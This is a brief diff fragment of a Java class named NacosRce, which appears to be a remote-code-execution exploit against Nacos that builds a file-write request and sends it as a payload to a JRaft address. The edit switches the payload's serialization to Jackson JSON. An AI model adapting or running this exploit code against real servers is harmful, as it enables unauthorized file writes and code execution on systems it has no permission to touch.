@@ -78,10 +78,10 @@ public class NacosRce {
             BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
             batchWriteRequest.append(FileBytes,ContentBytes);
 
-            ByteArrayOutputStream baos0 = getByteArrayOutputStream(batchWriteRequest);
+            byte[] json= JacksonSerializer.serialize(batchWriteRequest);
 
             try {
-                sendPayload(jraftAddr,baos0.toByteArray());
+                sendPayload(jraftAddr,json);
             }catch (Exception e){
                 e.printStackTrace();
             }
